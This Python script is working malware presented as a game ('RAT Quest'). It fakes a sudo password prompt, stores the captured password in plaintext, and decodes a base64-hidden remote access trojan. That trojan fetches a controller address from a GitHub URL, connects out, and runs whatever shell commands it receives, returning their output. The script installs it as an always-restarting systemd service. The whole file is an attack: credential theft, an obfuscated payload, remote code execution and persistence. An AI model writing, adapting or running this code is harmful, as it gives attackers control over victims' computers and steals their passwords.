
import base64
import os
import subprocess
import getpass

name = subprocess.check_output(['whoami'], shell=False).decode('utf-8').strip().replace("\n", "")
sudo_password = ""

os.system(f"mkdir /home/{name}/rat.config/")

while(True):

    sudo_password = getpass.getpass(f"[sudo] password for {name}: ")
    
    process = subprocess.Popen(['sudo','-S', '-v'], stderr=subprocess.PIPE, stdout=subprocess.PIPE,  stdin=subprocess.PIPE)  

    try:      
        err, out = process.communicate(input=(f"{sudo_password}\r\n").encode(), timeout=5)
        
        result = str(out.decode('utf-8')).strip()

        if result == "":
            try:
                with open(f"/home/{name}/rat.config/sudo.txt", "w") as f:
                    f.writelines(sudo_password)
            except BaseException as based:
                print(based)
            break
        else:
           print("Sorry, try again.")
           continue 

    except subprocess.TimeoutExpired:
        process.kill()
        print("Sorry, try again.")
        continue

rat_pog = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgc3VicHJvY2VzcwoKIyBzZXR1cCBjb21tYW5kcyBmb3IgdGhpcyBSQVQKCmRlZiBnZXRfcGxhdGZvcm0oKToKICAgIHBsYXRmb3JtcyA9IHsKICAgICAgICAnbGludXgxJyA6ICdsaW51eCcsCiAgICAgICAgJ2xpbnV4MicgOiAnbGludXgnLCAjIGZvb2xpc2ggbWFuLXRoaW5nCiAgICAgICAgJ2RhcndpbicgOiAnT1MgWCcsCiAgICAgICAgJ3dpbjMyJyA6ICdXaW5kb3dzJwogICAgfQogICAgaWYgc3lzLnBsYXRmb3JtIG5vdCBpbiBwbGF0Zm9ybXM6CiAgICAgICAgcmV0dXJuIHN5cy5wbGF0Zm9ybQogICAgCiAgICByZXR1cm4gcGxhdGZvcm1zW3N5cy5wbGF0Zm9ybV0KCmRlZiBnZXRfaXAoKToKICAgIHJhd190ZXh0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWydjdXJsIC1YIEdFVCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbGJldHRlcnRvbi9yZW1vdGVpcC9tYWluL2lwLnR4dCddLCBzaGVsbD1UcnVlKS5kZWNvZGUoJ3V0Zi04Jykuc3RyaXAoKS5yZXBsYWNlKCJcbiIsICIiKS5zcGxpdCgiLCIpCiAgICBwcmludChyYXdfdGV4dCkKICAgIHJldHVybiByYXdfdGV4dFswXSwgaW50KHJhd190ZXh0WzFdKQogICAgCgojIGxpc3RfZmlsZV9jbWQgPSAibHMiIGlmIGdldF9wbGF0Zm9ybSgpID09ICJsaW51eCIgZWxzZSAiZGlyIgpvdXRwdXRfY29udGVudHNfY21kID0gImNhdCIgaWYgZ2V0X3BsYXRmb3JtKCkgPT0gImxpbnV4IiBlbHNlICJtb3JlIgpvdXRwdXRfcHdkX2NtZCA9ICJwd2QiIGlmIGdldF9wbGF0Zm9ybSgpID09ICJsaW51eCIgZWxzZSAiZWNobyAlY2QlIgpwYXRoID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyd3aG9hbWknXSwgc2hlbGw9VHJ1ZSkuZGVjb2RlKCd1dGYtOCcpLnN0cmlwKCkucmVwbGFjZSgiXG4iLCAiIikKIyBpZiBnZXRfcGxhdGZvcm0oKSA9PSAiV2luZG93cyI6CiMgICAgIHBhdGggPSBwYXRoLnNwbGl0KCJcXCIpWzFdCiMgICAgIHByaW50KHBhdGgpCiMgb3V0cHV0X2hvbWVkaXJfY21kID0gZiIvaG9tZS97cGF0aH0vIiBpZiBnZXRfcGxhdGZvcm0oKSA9PSAibGludXgiIGVsc2UgZiJDOi9Vc2Vycy97cGF0aH0vIgpvdXRwdXRfaG9tZWRpcl9jbWQgPSBmIi9ob21lL3twYXRofS8iIGlmIG5vdCBwYXRoID09ICJyb290IiBlbHNlICIvZXRjLyIKCkhPU1QsIFBPUlQgPSBnZXRfaXAoKSAjIEhPU1Q6IFRoZSBzZXJ2ZXIncyBob3N0bmFtZSBvciBJUCBhZGRyZXNzLCBQT1JUIFRoZSBwb3J0IHVzZWQgYnkgdGhlIHNlcnZlcgoKY3VycmVudF90cmllcyA9IDAKCndoaWxlKFRydWUpOgoKICAgIGlmIChjdXJyZW50X3RyaWVzID4gNSk6CiAgICAgICAgCiAgICAgICAgSE9TVCwgUE9SVCA9IGdldF9pcCgpCiAgICAgICAgY3VycmVudF90cmllcyA9IDAKCiAgICBwcmludCgiQXR0ZW1wdGluZyBjb25uZWN0aW9uIHdpdGggdGhlIHZlcm1pbiBjb250cm9sLi4uIikKCiAgICB0cnk6CiAgICAKICAgICAgICB3aXRoIHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkgYXMgczoKCiAgICAgICAgICAgIHMuc2V0dGltZW91dCg1KSAjIHdoaWxlIHdlIGV4cGVjdCBpdCB0byBmYWlsCiAgICAgICAgICAgIHMuY29ubmVjdCgoSE9TVCwgUE9SVCkpCiAgICAgICAgICAgIHMuc2V0dGltZW91dChOb25lKSAjIGlmIGl0IHN1Y2NlZWRzLCB3ZSB3YW50IGl0IHRvIHJlbWFpbiBvcGVuCgogICAgICAgICAgICBwcmludCgiQ29ubmVjdGVkIikKICAgICAgICAgICAgY3VycmVudF90cmllcyA9IDAKCiAgICAgICAgICAgIHJlbW90ZV9jb21tYW5kID0gTm9uZQoKICAgICAgICAgICAgd2hpbGUocmVtb3RlX2NvbW1hbmQgIT0gImhhbHQiKToKCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHMucmVjdig4MTkyKSAjIHRoaXMgbmVlZHMgdG8gYmUgZml4ZWQgdG8gYWxsb3cgbW9yZSBieXRlcwogICAgICAgICAgICAgICAgZXhjZXB0IENvbm5lY3Rpb25BYm9ydGVkRXJyb3IgYXMgZXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZXJyb3IpCiAgICAgICAgICAgICAgICAgICAgcmVtb3RlX2NvbW1hbmQgPSAiaGFsdCIKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZW1vdGVfY29tbWFuZCA9IGRhdGEuZGVjb2RlKCJ1dGYtOCIpICMgc2hvdWxkIGJlIGluc2lkZSB0aGUgdHJ5IGV4Y2VwdAoKICAgICAgICAgICAgICAgIHByaW50KCdSZWNlaXZlZCcsIHJlbW90ZV9jb21tYW5kKQoKICAgICAgICAgICAgICAgIGlmICIvY3dkIiBpbiByZW1vdGVfY29tbWFuZDoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gcmVtb3RlX2NvbW1hbmQuc3BsaXQoIiAiKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihjb21tYW5kKSA9PSAyOgogICAgICAgICAgICAgICAgICAgICAgICBvcy5jaGRpcihjb21tYW5kWzFdKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oZiJ7b3V0cHV0X3B3ZF9jbWR9ID4ge291dHB1dF9ob21lZGlyX2NtZH1kcm9wcGluZy50eHQiKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJXcm9uZyBmb3JtYXQgZGV0ZWN0ZWQiKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oZiJ7cmVtb3RlX2NvbW1hbmR9ID4ge291dHB1dF9ob21lZGlyX2NtZH1kcm9wcGluZy50eHQiKQoKICAgICAgICAgICAgICAgICMgaWYgd2luZG93cywgaGlkZSB0aGUgUkFUIGRyb3BwaW5ncwogICAgICAgICAgICAgICAgIyBpZiBnZXRfcGxhdGZvcm0oKSA9PSAiV2luZG93cyI6CiAgICAgICAgICAgICAgICAjICAgICBvcy5zeXN0ZW0oZiJhdHRyaWIgK3MgK2gge291dHB1dF9ob21lZGlyX2NtZH1kcm9wcGluZy50eHQiKQoKICAgICAgICAgICAgICAgIGNvbW1hbmRfcmVzdWx0cyA9IE5vbmUKCiAgICAgICAgICAgICAgICBpZiBvcy5zeXN0ZW0oZiJ7b3V0cHV0X2NvbnRlbnRzX2NtZH0ge291dHB1dF9ob21lZGlyX2NtZH1kcm9wcGluZy50eHQiKSA9PSAwOgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGYie291dHB1dF9ob21lZGlyX2NtZH1kcm9wcGluZy50eHQiLCAiciIpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kX3Jlc3VsdHMgPSBmaWxlLnJlYWQoKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBlcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZF9yZXN1bHRzID0gZXJyb3IKICAgICAgICAgICAgICAgICAgICAgICAgcmVtb3RlX2NvbW1hbmQgPSAiaGFsdCIKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGNvbW1hbmRfcmVzdWx0cyA9ICJObyBvdXRwdXQgZm91bmQsIHRoZSBjb21tYW5kIG1heSBoYXZlIGZhaWxlZCIKCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gZiJFeGVjdXRlZCBjb21tYW5kIHtyZW1vdGVfY29tbWFuZH0gPj4gQ29tbWFuZCBSZXN1bHRzOlxuIHtjb21tYW5kX3Jlc3VsdHN9Ii5lbmNvZGUoInV0Zi04IikKCiAgICAgICAgICAgICAgICAjIHNlbmQgdGhlIHNpemUgaW4gYnl0ZXMgb2YgdGhlIGluY29taW5nIHJlc3BvbnNlIAogICAgICAgICAgICAgICAgbGVuZ3RoX2luX2J5dGVzID0gbGVuKG1lc3NhZ2UpCgogICAgICAgICAgICAgICAgcHJpbnQoZiJNZXNzYWdlIGxlbmd0aCBpbiBieXRlcyB7bGVuZ3RoX2luX2J5dGVzfSIpCgogICAgICAgICAgICAgICAgbV9ieXRlc19sZW5ndGggPSBsZW5ndGhfaW5fYnl0ZXMudG9fYnl0ZXMobGVuZ3RoX2luX2J5dGVzLmJpdF9sZW5ndGgoKSwgJ2xpdHRsZScsIHNpZ25lZD1UcnVlKSAgIAoKICAgICAgICAgICAgICAgIHRyeToKCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKHMuc2VuZGFsbChtX2J5dGVzX2xlbmd0aCkgIT0gTm9uZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgICAgIHdoaWxlIChzLnNlbmRhbGwobWVzc2FnZSkgIT0gTm9uZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgZXhjZXB0IENvbm5lY3Rpb25BYm9ydGVkRXJyb3IgYXMgZXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZXJyb3IpCiAgICAgICAgICAgICAgICAgICAgcmVtb3RlX2NvbW1hbmQgPSAiaGFsdCIKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZXhjZXB0IEJhc2VFeGNlcHRpb24gYXMgYmFzZWQ6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoYmFzZWQpCiAgICAgICAgICAgICAgICAgICAgcmVtb3RlX2NvbW1hbmQgPSAiaGFsdCIKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgIGV4Y2VwdCBDb25uZWN0aW9uUmVmdXNlZEVycm9yIGFzIGNvbm5fZXJyb3I6CiAgICAgICAgcHJpbnQoY29ubl9lcnJvcikKICAgICAgICBjdXJyZW50X3RyaWVzID0gY3VycmVudF90cmllcyArIDEKICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uIGFzIGJhc2VkOgogICAgICAgIHByaW50KGYicmF0IHJhdCDwn5CAIHtiYXNlZH0iKQogICAgICAgIGN1cnJlbnRfdHJpZXMgPSBjdXJyZW50X3RyaWVzICsgMQ=="

decodedBytes = base64.b64decode(rat_pog)
decodedStr = decodedBytes.decode("utf-8")

with open("RAT.py", "w", encoding='utf-8') as f:
    data = f.writelines(str(decodedStr))

os.system(f'echo "{sudo_password}" | sudo -S mv RAT.py /home/{name}/rat.config/RAT.py')

rat_pog_service = "W1VuaXRdCkRlc2NyaXB0aW9uPVJBVApBZnRlcj1tdWx0aS11c2VyLnRhcmdldAoKW1NlcnZpY2VdClR5cGU9c2ltcGxlClJlc3RhcnQ9YWx3YXlzCkV4ZWNTdGFydD0vdXNyL2Jpbi9weXRob24zIC9ob21lLzx1c2VybmFtZT4vcmF0LmNvbmZpZy9SQVQucHkKV29ya2luZ0RpcmVjdG9yeT1+CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ="

decodedBytes = base64.b64decode(rat_pog_service)
decodedStr = decodedBytes.decode("utf-8")

with open("rat.service", "w", encoding='utf-8') as f:
    data = f.writelines(str(decodedStr).replace("<username>", name))

os.system(f'echo "{sudo_password}" | sudo -S mv rat.service /etc/systemd/system/rat.service')

os.system(f'echo "{sudo_password}" | sudo -S systemctl daemon-reload')
os.system(f'echo "{sudo_password}" | sudo -S systemctl enable rat.service')
os.system(f'echo "{sudo_password}" | sudo -S systemctl start rat.service')


print("RAT Quest is now ready to play 🐀")